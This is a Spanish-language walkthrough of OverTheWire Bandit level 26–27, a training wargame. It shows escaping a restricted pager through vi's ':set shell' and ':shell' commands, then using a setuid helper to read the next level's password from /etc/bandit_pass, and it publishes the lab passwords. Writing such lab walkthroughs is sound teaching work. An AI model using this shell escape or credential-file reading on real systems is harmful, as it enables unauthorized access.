# Level 26 - 27
---
## Objetivo 
Good job getting a shell! Now hurry and grab the password for bandit27!

---
## Datos de acceso al nivel 

```
Server  : **bandit.labs.overthewire.org**
User    : **bandit26**
Pasword : **c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1**
Puerto  : 2220 
```

---
## Solución 

**Antes de empezar se hace la ventana de la consola mas pequeña, igual que el reto anterior**

**Primero se accede al servidor**
```bash
ssh bandit26@bandit.labs.overthewire.org -p 2220
```
**Contraseña de usuario**
```
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
```

**Después se hace lo siguiente en la consola**

```bash
## una ves que se muestre la infommacion por paginas volvemos a acceder al vi
v
## dentro ejecutamos estos 2 comandos
:set shell=/bin/bash
:shell  # nos perimite entrar al shell para escribir mas comandos

## dentro del shell que salen en el vi
ls
# bandit27-do text.txt
./bandit27-do id
# uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
./bandit27-do cat /etc/bandit_pass/bandit27
# YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
## salimos del shell
exit
## salimos del vi
:qa 
```

**Resultado final**

```
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
```

---
## Notas Adicionales 

---
## Referencias 
